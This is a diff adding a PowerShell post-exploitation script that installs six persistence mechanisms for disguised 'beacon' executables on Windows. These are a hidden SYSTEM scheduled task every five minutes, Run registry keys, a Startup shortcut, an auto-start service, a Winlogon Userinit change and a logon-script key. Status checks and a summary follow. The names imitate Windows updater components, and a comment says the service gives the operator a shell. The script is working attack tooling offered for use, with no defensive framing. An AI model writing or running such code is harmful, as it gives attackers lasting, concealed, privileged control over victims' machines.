@@ -1,0 +1,123 @@
+# PowerShell persistence script
+
+# Define beacon paths
+$beaconPaths = @(
+    "C:\ProgramData\wininfo\info.exe",
+    "C:\Windows\Temp\windata\windata.exe",
+    "C:\Users\$env:USERNAME\AppData\Local\Microsoft\Windows\winupdater\wupdater.exe",
+    "C:\ProgramData\Microsoft\Windows\winsvc\wsvc.exe",
+    "C:\Windows\System32\Tasks\taskhost.exe"
+)
+
+# 1. Create scheduled task (5-minute interval)
+Write-Host "[+] Creating scheduled task persistence..."
+$action = New-ScheduledTaskAction -Execute $beaconPaths[0]
+$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration (New-TimeSpan -Days 365) 
+$settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
+$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+Register-ScheduledTask -TaskName "WindowsUpdater" -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force
+
+# 2. Registry Run Key (runs on login)
+Write-Host "[+] Creating registry run key persistence..."
+New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdaterSvc" -Value $beaconPaths[1] -PropertyType String -Force
+New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdaterSvc" -Value $beaconPaths[1] -PropertyType String -Force
+
+# 3. Startup Folder
+Write-Host "[+] Creating startup folder persistence..."
+$startupPath = "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\winupdater.lnk"
+$WshShell = New-Object -ComObject WScript.Shell
+$shortcut = $WshShell.CreateShortcut($startupPath)
+$shortcut.TargetPath = $beaconPaths[2]
+$shortcut.Save()
+
+# 4. Service Persistence
+Write-Host "[+] Creating service persistence..."
+New-Service -Name "WinUpdaterSvc" -BinaryPathName $beaconPaths[3] -DisplayName "Windows Updater Service" -StartupType Automatic -Description "Provides support for Windows Updater services" -ErrorAction SilentlyContinue
+Start-Service -Name "WinUpdaterSvc" # run the service, giving us a shell
+
+# 5. Registry UserInit (runs on user login)
+Write-Host "[+] Creating UserInit registry persistence..."
+$userInitKey = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+$userInitValue = (Get-ItemProperty -Path $userInitKey -Name "Userinit").Userinit
+if (-not $userInitValue.EndsWith(",")) {
+    $userInitValue += ","
+}
+$userInitValue += $beaconPaths[0]
+Set-ItemProperty -Path $userInitKey -Name "Userinit" -Value $userInitValue
+
+# 6. Registry Logon Script (domain persistence)
+Write-Host "[+] Creating logon script registry persistence..."
+try {
+    $logonScriptKey = "HKCU:\Environment"
+    Set-ItemProperty -Path $logonScriptKey -Name "UserInitMprLogonScript" -Value $beaconPaths[1] -Type String -Force
+} catch {
+    Write-Host "[-] Could not create logon script persistence."
+}
+
+Write-Host "`n[+] Persistence Installation Complete. Performing status checks..."
+Write-Host "----------------------------------------"
+
+# Status Checks
+Write-Host "`n[*] Checking Scheduled Task persistence..."
+$task = Get-ScheduledTask -TaskName "WindowsUpdater" -ErrorAction SilentlyContinue
+if ($task) {
+    Write-Host "[√] Scheduled Task 'WindowsUpdater' installed successfully."
+} else {
+    Write-Host "[✗] Scheduled Task installation failed."
+}
+
+Write-Host "`n[*] Checking Registry Run Key persistence..."
+$runKey = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdaterSvc" -ErrorAction SilentlyContinue
+if ($runKey) {
+    Write-Host "[√] Registry Run Key 'WindowsUpdaterSvc' set successfully."
+} else {
+    Write-Host "[✗] Registry Run Key installation failed."
+}
+
+Write-Host "`n[*] Checking Startup Folder persistence..."
+if (Test-Path $startupPath) {
+    Write-Host "[√] Startup shortcut created successfully."
+} else {
+    Write-Host "[✗] Startup shortcut creation failed."
+}
+
+Write-Host "`n[*] Checking Service persistence..."
+$service = Get-Service -Name "WinUpdaterSvc" -ErrorAction SilentlyContinue
+if ($service) {
+    Write-Host "[√] Service 'WinUpdaterSvc' created successfully."
+    Write-Host "    Status: $($service.Status)"
+    Write-Host "    Startup Type: $($service.StartType)"
+} else {
+    Write-Host "[✗] Service creation failed."
+}
+
+Write-Host "`n[*] Checking UserInit Registry persistence..."
+$userInitCurrent = (Get-ItemProperty -Path $userInitKey -Name "Userinit").Userinit
+if ($userInitCurrent.Contains($beaconPaths[0])) {
+    Write-Host "[√] UserInit registry modified successfully."
+} else {
+    Write-Host "[✗] UserInit registry modification failed."
+}
+
+Write-Host "`n[*] Checking Logon Script Registry persistence..."
+$logonScript = Get-ItemProperty -Path $logonScriptKey -Name "UserInitMprLogonScript" -ErrorAction SilentlyContinue
+if ($logonScript) {
+    Write-Host "[√] Logon Script registry set successfully."
+} else {
+    Write-Host "[✗] Logon Script registry setting failed."
+}
+
+Write-Host "`n[*] Summary of Persistence Mechanisms:"
+Write-Host "----------------------------------------"
+Write-Host "1. Scheduled Task (5min): " -NoNewline
+if ($task) { Write-Host "INSTALLED" -ForegroundColor Green } else { Write-Host "FAILED" -ForegroundColor Red }
+Write-Host "2. Registry Run Key: " -NoNewline
+if ($runKey) { Write-Host "INSTALLED" -ForegroundColor Green } else { Write-Host "FAILED" -ForegroundColor Red }
+Write-Host "3. Startup Folder: " -NoNewline
+if (Test-Path $startupPath) { Write-Host "INSTALLED" -ForegroundColor Green } else { Write-Host "FAILED" -ForegroundColor Red }
+Write-Host "4. Service: " -NoNewline
+if ($service) { Write-Host "INSTALLED" -ForegroundColor Green } else { Write-Host "FAILED" -ForegroundColor Red }
+Write-Host "5. UserInit Registry: " -NoNewline
+if ($userInitCurrent.Contains($beaconPaths[0])) { Write-Host "INSTALLED" -ForegroundColor Green } else { Write-Host "FAILED" -ForegroundColor Red }
+Write-Host "6. Logon Script Registry: " -NoNewline
+if ($logonScript) { Write-Host "INSTALLED" -ForegroundColor Green } else { Write-Host "FAILED" -ForegroundColor Red }
